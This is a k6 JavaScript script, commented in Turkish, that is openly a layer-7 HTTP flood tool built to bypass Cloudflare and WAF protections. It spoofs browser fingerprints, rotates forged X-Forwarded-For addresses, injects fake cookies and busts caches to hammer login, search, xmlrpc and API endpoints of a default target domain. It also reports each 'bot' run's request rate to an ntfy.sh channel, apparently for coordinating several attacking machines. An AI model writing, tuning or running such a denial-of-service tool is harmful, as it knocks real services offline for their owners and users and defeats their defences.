// ================================================================
// 🔥 k6 SUPER FLOOD — Cloudflare/WAF Bypass Odaklı
//
// TEKNIKLER:
//   ✅ Path-based cache-buster (query-param'dan daha güçlü)
//   ✅ Multi-endpoint weighted random (search/api/login/wp-json/dynamic)
//   ✅ HTTP method mix (GET/POST/HEAD/OPTIONS)
//   ✅ Modern Chrome fingerprint (sec-ch-ua, sec-fetch-*)
//   ✅ X-Forwarded-For rotasyonu
//   ✅ Referrer chain rotasyonu (Google/FB/Twitter/direct)
//   ✅ Fake cookie injection (session variance)
//   ✅ Random JSON POST body (backend işleme zorlar)
//   ✅ Ramping-arrival-rate executor (RPS garantili)
//   ✅ Metric explosion fix (unique URL tagsız)
//   ✅ HTTP/2 + TLS optimizasyonu
//
// ENV:
//   TARGET_URL     - hedef base URL
//   DURATION       - test süresi (60s, 5m)
//   VUS            - VU (fallback için)
//   RPS            - saniyede istek (0 = max)
//   BOT_ID         - runner bot numarası
//   HOST_HEADER    - Cloudflare bypass için (opsiyonel)
//   ENDPOINTS      - virgülle ayrık path listesi (opsiyonel, override)
//   METHOD_MIX     - "get,post,head,options" ağırlıkları (opsiyonel)
// ================================================================

import http from 'k6/http';
import { check } from 'k6';
import exec from 'k6/execution';
import { Counter, Trend, Rate } from 'k6/metrics';
import { randomIntBetween, randomString } from 'https://jslib.k6.io/k6-utils/1.4.0/index.js';

const TARGET_URL = (__ENV.TARGET_URL || 'https://hhh.frostai.com.tr').replace(/\/$/, '');
const BOT_ID = __ENV.BOT_ID || '0';
const HOST_HEADER = __ENV.HOST_HEADER || '';
const DURATION = __ENV.DURATION || '60s';
const VUS = parseInt(__ENV.VUS || '300', 10);
const RPS = parseInt(__ENV.RPS || '0', 10);

// ---- METRİKLER (endpoint bazlı — high cardinality yok) ----
const bytesReceived = new Counter('bytes_received_total');
const successRate = new Rate('success_rate');
const rate2xx = new Rate('rate_2xx');
const rate3xx = new Rate('rate_3xx');
const rate4xx = new Rate('rate_4xx');
const rate5xx = new Rate('rate_5xx');
const rate429 = new Rate('rate_429');
const responseTime = new Trend('response_time_ms', true);
const ttfb = new Trend('ttfb_ms', true);

// ================================================================
// ENDPOINT ARSENAL — Dynamic / Uncacheable Odaklı
// ================================================================
const DEFAULT_ENDPOINTS = [
    // Ana sayfa & static-like (weight düşük — cache HIT yer)
    { path: '/', weight: 5, method: 'GET' },
    { path: '/index.html', weight: 3, method: 'GET' },
    { path: '/robots.txt', weight: 2, method: 'GET' },
    { path: '/sitemap.xml', weight: 2, method: 'GET' },
    { path: '/favicon.ico', weight: 2, method: 'GET' },

    // Search endpoint'leri — DB'ye direkt vurur, cache YOK
    { path: '/search?q=', weight: 15, method: 'GET', dynamicQuery: true },
    { path: '/?s=', weight: 10, method: 'GET', dynamicQuery: true },
    { path: '/search/', weight: 8, method: 'GET', appendRandom: true },

    // WordPress spesifik
    { path: '/wp-login.php', weight: 8, method: 'GET' },
    { path: '/wp-admin/admin-ajax.php', weight: 6, method: 'GET' },
    { path: '/wp-json/wp/v2/posts', weight: 8, method: 'GET', dynamicQuery: true, queryKey: '?per_page=' },
    { path: '/wp-json/wp/v2/users', weight: 6, method: 'GET' },
    { path: '/wp-content/uploads/', weight: 3, method: 'GET', appendRandom: true },
    { path: '/xmlrpc.php', weight: 5, method: 'POST', isXmlrpc: true },

    // API endpoint'leri — JSON, cache'lenmez
    { path: '/api/v1/', weight: 8, method: 'GET', appendRandom: true },
    { path: '/api/v2/', weight: 6, method: 'GET', appendRandom: true },
    { path: '/api/users', weight: 6, method: 'GET' },
    { path: '/api/products', weight: 6, method: 'GET', dynamicQuery: true, queryKey: '?id=' },
    { path: '/api/search', weight: 8, method: 'POST', isSearchApi: true },
    { path: '/graphql', weight: 6, method: 'POST', isGraphql: true },

    // Auth / heavy processing endpoint'leri
    { path: '/login', weight: 6, method: 'POST', isLogin: true },
    { path: '/register', weight: 4, method: 'POST', isRegister: true },
    { path: '/contact', weight: 4, method: 'POST', isContact: true },
    { path: '/newsletter/subscribe', weight: 3, method: 'POST', isNewsletter: true },

    // Dynamic detail sayfaları (ID'li)
    { path: '/product/', weight: 8, method: 'GET', appendRandomId: true },
    { path: '/user/', weight: 6, method: 'GET', appendRandomId: true },
    { path: '/post/', weight: 6, method: 'GET', appendRandomId: true },
    { path: '/article/', weight: 5, method: 'GET', appendRandomId: true },
    { path: '/category/', weight: 5, method: 'GET', appendRandomSlug: true },
    { path: '/tag/', weight: 5, method: 'GET', appendRandomSlug: true },

    // FastAPI / Django tipik endpoint'ler
    { path: '/docs', weight: 3, method: 'GET' },
    { path: '/openapi.json', weight: 3, method: 'GET' },
    { path: '/health', weight: 2, method: 'GET' },
    { path: '/status', weight: 2, method: 'GET' },
    { path: '/metrics', weight: 2, method: 'GET' },

    // Cache-buster path (universal)
    { path: '/', weight: 15, method: 'GET', appendCacheBusterPath: true }
];

// ENV ile override
let ENDPOINTS = DEFAULT_ENDPOINTS;
if (__ENV.ENDPOINTS) {
    ENDPOINTS = __ENV.ENDPOINTS.split(',').map(p => ({ path: p.trim(), weight: 10, method: 'GET' }));
}

// Weight tablosu (cumulative)
const totalWeight = ENDPOINTS.reduce((s, e) => s + e.weight, 0);
const cumWeights = [];
let acc = 0;
for (const e of ENDPOINTS) {
    acc += e.weight;
    cumWeights.push(acc);
}

function pickEndpoint() {
    const r = Math.random() * totalWeight;
    for (let i = 0; i < cumWeights.length; i++) {
        if (r < cumWeights[i]) return ENDPOINTS[i];
    }
    return ENDPOINTS[ENDPOINTS.length - 1];
}

// ================================================================
// FINGERPRINT VARIANTS — Modern Chrome/Firefox/Safari
// ================================================================
const BROWSER_PROFILES = [
    {
        name: 'chrome-120-win',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        secChUa: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        secChUaMobile: '?0',
        secChUaPlatform: '"Windows"'
    },
    {
        name: 'chrome-121-mac',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        secChUa: '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        secChUaMobile: '?0',
        secChUaPlatform: '"macOS"'
    },
    {
        name: 'chrome-122-linux',
        ua: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        secChUa: '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
        secChUaMobile: '?0',
        secChUaPlatform: '"Linux"'
    },
    {
        name: 'edge-120-win',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        secChUa: '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
        secChUaMobile: '?0',
        secChUaPlatform: '"Windows"'
    },
    {
        name: 'firefox-121-win',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        secChUa: null,  // Firefox sec-ch-ua göndermez
        secChUaMobile: null,
        secChUaPlatform: null
    },
    {
        name: 'safari-17-mac',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        secChUa: null,
        secChUaMobile: null,
        secChUaPlatform: null
    },
    {
        name: 'chrome-mobile-android',
        ua: 'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        secChUa: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        secChUaMobile: '?1',
        secChUaPlatform: '"Android"'
    },
    {
        name: 'safari-mobile-ios',
        ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        secChUa: null,
        secChUaMobile: null,
        secChUaPlatform: null
    }
];

const ACCEPT_LANGUAGES = [
    'tr-TR,tr;q=0.9,en;q=0.8',
    'en-US,en;q=0.9',
    'tr,en-US;q=0.9,en;q=0.8',
    'en-GB,en;q=0.9',
    'de-DE,de;q=0.9,en;q=0.8',
    'fr-FR,fr;q=0.9,en;q=0.8'
];

const REFERRERS = [
    'https://www.google.com/',
    'https://www.google.com.tr/',
    'https://www.bing.com/',
    'https://duckduckgo.com/',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://x.com/',
    'https://www.instagram.com/',
    'https://www.linkedin.com/',
    'https://www.reddit.com/',
    'https://t.co/',
    'https://www.youtube.com/',
    'https://news.ycombinator.com/',
    '' // direct (no referrer)
];

function randomIP() {
    // Public IP simülasyonu (private range'ler hariç)
    const a = randomIntBetween(1, 223);
    if (a === 10 || a === 127 || a === 172 || a === 192) return randomIP();
    return `${a}.${randomIntBetween(0, 255)}.${randomIntBetween(0, 255)}.${randomIntBetween(1, 254)}`;
}

function randomCookie() {
    const cookies = [
        `_ga=GA1.2.${randomIntBetween(100000000, 999999999)}.${randomIntBetween(1600000000, 1750000000)}`,
        `_gid=GA1.2.${randomIntBetween(100000000, 999999999)}.${randomIntBetween(1600000000, 1750000000)}`,
        `session_id=${randomString(32, 'abcdefghijklmnopqrstuvwxyz0123456789')}`,
        `visitor_id=${randomString(16)}`
    ];
    return cookies.join('; ');
}

function buildHeaders(profile, endpoint) {
    const headers = {
        'User-Agent': profile.ua,
        'Accept': endpoint.method === 'POST'
            ? 'application/json, text/plain, */*'
            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': ACCEPT_LANGUAGES[Math.floor(Math.random() * ACCEPT_LANGUAGES.length)],
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'Connection': 'keep-alive',
        'DNT': Math.random() > 0.5 ? '1' : '0',
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For': randomIP(),
        'X-Real-IP': randomIP(),
        'X-Cache-Bypass': randomString(16),
        'X-Request-ID': randomString(32, 'abcdef0123456789')
    };

    // Chrome-specific fingerprint
    if (profile.secChUa) {
        headers['sec-ch-ua'] = profile.secChUa;
        headers['sec-ch-ua-mobile'] = profile.secChUaMobile;
        headers['sec-ch-ua-platform'] = profile.secChUaPlatform;
    }

    // Sec-fetch metadata (POST/GET farklı)
    if (endpoint.method === 'POST') {
        headers['Sec-Fetch-Dest'] = 'empty';
        headers['Sec-Fetch-Mode'] = 'cors';
        headers['Sec-Fetch-Site'] = 'same-origin';
        headers['Content-Type'] = 'application/json';
        headers['Origin'] = TARGET_URL;
    } else {
        headers['Sec-Fetch-Dest'] = 'document';
        headers['Sec-Fetch-Mode'] = 'navigate';
        headers['Sec-Fetch-Site'] = Math.random() > 0.5 ? 'none' : 'cross-site';
        headers['Sec-Fetch-User'] = '?1';
    }

    // Referrer (30% direkt, 70% social/search)
    const ref = REFERRERS[Math.floor(Math.random() * REFERRERS.length)];
    if (ref) headers['Referer'] = ref;

    // Cookie inject (60% olasılık)
    if (Math.random() < 0.6) {
        headers['Cookie'] = randomCookie();
    }

    // Cloudflare bypass: Host header override
    if (HOST_HEADER) {
        headers['Host'] = HOST_HEADER;
    }

    return headers;
}

// ================================================================
// URL BUILDER — cache bypass + dynamic path
// ================================================================
function buildURL(endpoint) {
    let path = endpoint.path;

    if (endpoint.appendCacheBusterPath) {
        // Path-based cache buster (query-string'den güçlü — bazı CDN'ler query'yi cache key'e katmaz)
        path = `/cache-${randomString(12, 'abcdefghijklmnopqrstuvwxyz0123456789')}${path === '/' ? '/' : path}`;
    } else if (endpoint.dynamicQuery) {
        const key = endpoint.queryKey || '';
        path = path + randomString(randomIntBetween(4, 12));
    } else if (endpoint.appendRandom) {
        path = path + randomString(randomIntBetween(6, 16));
    } else if (endpoint.appendRandomId) {
        path = path + randomIntBetween(1, 999999);
    } else if (endpoint.appendRandomSlug) {
        path = path + randomString(randomIntBetween(5, 12), 'abcdefghijklmnopqrstuvwxyz-');
    }

    // Ekstra query param (her isteğe hafif variance)
    const separator = path.includes('?') ? '&' : '?';
    if (Math.random() < 0.7) {
        path += `${separator}_t=${Date.now()}&_r=${randomString(8)}`;
    }

    return TARGET_URL + path;
}

// ================================================================
// POST BODY GENERATOR — endpoint tipine göre
// ================================================================
function buildBody(endpoint) {
    if (endpoint.isLogin) {
        return JSON.stringify({
            username: randomString(randomIntBetween(6, 14)),
            password: randomString(randomIntBetween(8, 20)),
            remember: Math.random() > 0.5,
            csrf_token: randomString(32)
        });
    }
    if (endpoint.isRegister) {
        return JSON.stringify({
            username: randomString(10),
            email: `${randomString(8)}@${randomString(6)}.com`,
            password: randomString(16),
            first_name: randomString(6),
            last_name: randomString(8)
        });
    }
    if (endpoint.isContact) {
        return JSON.stringify({
            name: randomString(10),
            email: `${randomString(8)}@example.com`,
            subject: randomString(20),
            message: randomString(randomIntBetween(100, 500))
        });
    }
    if (endpoint.isNewsletter) {
        return JSON.stringify({ email: `${randomString(8)}@${randomString(6)}.com` });
    }
    if (endpoint.isSearchApi) {
        return JSON.stringify({
            query: randomString(randomIntBetween(4, 20)),
            filters: { category: randomIntBetween(1, 10), price_min: randomIntBetween(0, 100), price_max: randomIntBetween(100, 10000) },
            page: randomIntBetween(1, 50),
            per_page: randomIntBetween(10, 100),
            sort: ['relevance', 'price_asc', 'price_desc', 'newest'][randomIntBetween(0, 3)]
        });
    }
    if (endpoint.isGraphql) {
        return JSON.stringify({
            query: `query { users(limit: ${randomIntBetween(10, 100)}, offset: ${randomIntBetween(0, 1000)}) { id name email posts { id title } } }`,
            variables: { search: randomString(10) }
        });
    }
    if (endpoint.isXmlrpc) {
        return `<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://${randomString(10)}.com/</string></value></param></params></methodCall>`;
    }
    // Generic POST
    return JSON.stringify({
        data: randomString(randomIntBetween(100, 1000)),
        timestamp: Date.now(),
        nonce: randomString(16)
    });
}

// ================================================================
// K6 OPTIONS — Ramping Arrival Rate Executor
// ================================================================
function buildScenarios() {
    // RPS > 0 → constant-arrival-rate (garantili RPS)
    if (RPS > 0) {
        return {
            flood: {
                executor: 'constant-arrival-rate',
                rate: RPS,
                timeUnit: '1s',
                duration: DURATION,
                preAllocatedVUs: Math.min(VUS, 500),
                maxVUs: VUS * 4,
                gracefulStop: '10s'
            }
        };
    }
    // RPS = 0 → ramping-arrival-rate (aggressive burst)
    return {
        flood: {
            executor: 'ramping-arrival-rate',
            startRate: Math.max(100, VUS * 2),
            timeUnit: '1s',
            preAllocatedVUs: Math.min(VUS, 500),
            maxVUs: VUS * 5,
            stages: [
                { duration: '10s', target: VUS * 10 },   // ramp up
                { duration: DURATION, target: VUS * 15 }, // sustain (max effort)
                { duration: '5s', target: 0 }             // wind down
            ],
            gracefulStop: '10s'
        }
    };
}

export const options = {
    scenarios: buildScenarios(),
    discardResponseBodies: false,
    batch: 30,
    batchPerHost: 30,
    insecureSkipTLSVerify: true,
    noConnectionReuse: false,  // reuse aç — throughput için
    userAgent: '',  // profile ile setleyeceğiz
    tlsVersion: {
        min: 'tls1.2',
        max: 'tls1.3'
    },
    // http/2 default zaten aktif k6'da
    summaryTrendStats: ['avg', 'min', 'med', 'max', 'p(90)', 'p(95)', 'p(99)'],
    thresholds: {
        // Sadece raporlama için — hiçbir threshold fail etmesin (test devam etsin)
        'http_reqs': ['count>=0']
    }
};

// ================================================================
// SETUP
// ================================================================
export function setup() {
    console.log(`═══════════════════════════════════════`);
    console.log(`  BOT #${BOT_ID} — SUPER FLOOD`);
    console.log(`  Target : ${TARGET_URL}`);
    console.log(`  Host   : ${HOST_HEADER || '(default)'}`);
    console.log(`  Duration: ${DURATION}`);
    console.log(`  VUs    : ${VUS}`);
    console.log(`  RPS    : ${RPS || 'MAX (ramping)'}`);
    console.log(`  Endpoints: ${ENDPOINTS.length}`);
    console.log(`═══════════════════════════════════════`);
}

// ================================================================
// LIVE PROGRESS LOGGER + NTFY REPORTER
// ================================================================
let __lastProgressLog = 0;
let __localReqs = 0;
let __local2xx = 0;
let __local5xx = 0;
let __local429 = 0;
let __localFail = 0;

const REPORT_CHANNEL = __ENV.REPORT_CHANNEL || '';
const ACCOUNT_NAME = __ENV.ACCOUNT_NAME || 'unknown';
const NTFY_URL = REPORT_CHANNEL ? `https://ntfy.sh/${REPORT_CHANNEL}` : '';

function logProgress(res) {
    __localReqs++;
    if (res.status >= 200 && res.status < 300) __local2xx++;
    else if (res.status >= 500) __local5xx++;
    else if (res.status === 429) __local429++;
    if (res.status === 0 || res.status >= 400) __localFail++;

    // Sadece 1. VU log basar
    if (exec.vu.idInTest !== 1) return;
    const now = Date.now();
    if (now - __lastProgressLog < 5000) return;
    __lastProgressLog = now;

    const elapsed = Math.floor(exec.instance.currentTestRunDuration / 1000);
    const vusActive = exec.instance.vusActive || 0;
    const iters = exec.instance.iterationsCompleted || __localReqs;
    const rps = elapsed > 0 ? Math.floor(iters / elapsed) : 0;
    const pct2xx = __localReqs > 0 ? Math.floor((__local2xx / __localReqs) * 100) : 0;
    const pct5xx = __localReqs > 0 ? Math.floor((__local5xx / __localReqs) * 100) : 0;
    const pct429 = __localReqs > 0 ? Math.floor((__local429 / __localReqs) * 100) : 0;

    console.log(`[LIVE bot=${BOT_ID}] t=${elapsed}s | iters=${iters} | vus=${vusActive} | rps~${rps} | 2xx=${pct2xx}% 5xx=${pct5xx}% 429=${pct429}% | last=${res.status}`);

    // ntfy.sh'e POST (k6 içinden doğrudan)
    if (NTFY_URL && elapsed > 5) {
        const mbps = Math.floor(rps * 1400 * 8 / 1000000);
        try {
            http.post(NTFY_URL, JSON.stringify({
                bot_id: BOT_ID, account: ACCOUNT_NAME, type: 'L7',
                rps: rps, mbps: mbps, reqs: iters, vus: vusActive,
                elapsed: elapsed, pct2xx: pct2xx, pct5xx: pct5xx, pct429: pct429
            }), { headers: { 'Title': 'metric', 'Content-Type': 'application/json' }, tags: { name: 'ntfy_report' }, timeout: '3s' });
        } catch (e) { /* skip */ }
    }
}

// ================================================================
// MAIN LOOP
// ================================================================
export default function () {
    const endpoint = pickEndpoint();
    const profile = BROWSER_PROFILES[Math.floor(Math.random() * BROWSER_PROFILES.length)];
    const url = buildURL(endpoint);
    const headers = buildHeaders(profile, endpoint);

    let res;
    const params = {
        headers: headers,
        timeout: '20s',
        // KRİTİK: tag olarak sadece endpoint tipi — unique URL tag YOK
        tags: {
            endpoint_type: endpoint.path.split('?')[0].split('/').slice(0, 3).join('/') || '/',
            method: endpoint.method
        },
        redirects: 3
    };

    if (endpoint.method === 'POST') {
        res = http.post(url, buildBody(endpoint), params);
    } else if (endpoint.method === 'HEAD') {
        res = http.head(url, params);
    } else if (endpoint.method === 'OPTIONS') {
        res = http.options(url, null, params);
    } else {
        res = http.get(url, params);
    }

    // Metrics
    if (res.body) bytesReceived.add(res.body.length);
    successRate.add(res.status >= 200 && res.status < 400);
    rate2xx.add(res.status >= 200 && res.status < 300);
    rate3xx.add(res.status >= 300 && res.status < 400);
    rate4xx.add(res.status >= 400 && res.status < 500);
    rate5xx.add(res.status >= 500);
    rate429.add(res.status === 429);
    responseTime.add(res.timings.duration);
    ttfb.add(res.timings.waiting);

    check(res, {
        'status ok (2xx/3xx)': (r) => r.status >= 200 && r.status < 400
    });

    logProgress(res);
}

// ================================================================
// TEARDOWN
// ================================================================
export function teardown() {
    console.log(`BOT #${BOT_ID} tamamlandı`);
}

// ================================================================
// HANDLE SUMMARY — Genişletilmiş rapor
// ================================================================
export function handleSummary(data) {
    const m = data.metrics;
    const reqs = m.http_reqs ? (m.http_reqs.values.count || 0) : 0;
    const bytes = m.data_received ? (m.data_received.values.count || 0) : 0;
    const bytesSent = m.data_sent ? (m.data_sent.values.count || 0) : 0;
    const failed = m.http_req_failed ? (m.http_req_failed.values.rate || 0) : 0;
    const p50 = m.http_req_duration ? (m.http_req_duration.values['p(50)'] || m.http_req_duration.values.med || 0) : 0;
    const p95 = m.http_req_duration ? (m.http_req_duration.values['p(95)'] || 0) : 0;
    const p99 = m.http_req_duration ? (m.http_req_duration.values['p(99)'] || 0) : 0;
    const avgRps = reqs > 0 && data.state && data.state.testRunDurationMs
        ? (reqs / (data.state.testRunDurationMs / 1000)).toFixed(0)
        : 'N/A';

    const r2xx = m.rate_2xx ? (m.rate_2xx.values.rate * 100).toFixed(1) : '0.0';
    const r3xx = m.rate_3xx ? (m.rate_3xx.values.rate * 100).toFixed(1) : '0.0';
    const r4xx = m.rate_4xx ? (m.rate_4xx.values.rate * 100).toFixed(1) : '0.0';
    const r5xx = m.rate_5xx ? (m.rate_5xx.values.rate * 100).toFixed(1) : '0.0';
    const r429 = m.rate_429 ? (m.rate_429.values.rate * 100).toFixed(1) : '0.0';

    const summary =
        `═══════════════════════════════════════════════════
  BOT #${BOT_ID} — SUPER FLOOD SUMMARY
═══════════════════════════════════════════════════
  İstek       : ${reqs}
  Ortalama RPS: ${avgRps}
  Veri (in)   : ${(bytes / 1024 / 1024).toFixed(2)} MB
  Veri (out)  : ${(bytesSent / 1024 / 1024).toFixed(2)} MB
  Hata oranı  : ${(failed * 100).toFixed(2)}%
  ---------------------------------------------------
  2xx         : ${r2xx}%
  3xx         : ${r3xx}%
  4xx         : ${r4xx}%
  5xx         : ${r5xx}%
  429 (RL)    : ${r429}%
  ---------------------------------------------------
  Response p50: ${p50.toFixed(0)}ms
  Response p95: ${p95.toFixed(0)}ms
  Response p99: ${p99.toFixed(0)}ms
═══════════════════════════════════════════════════
`;

    const result = {};
    result['stdout'] = summary;
    result[`reports/bot-${BOT_ID}-summary.json`] = JSON.stringify(data);
    return result;
}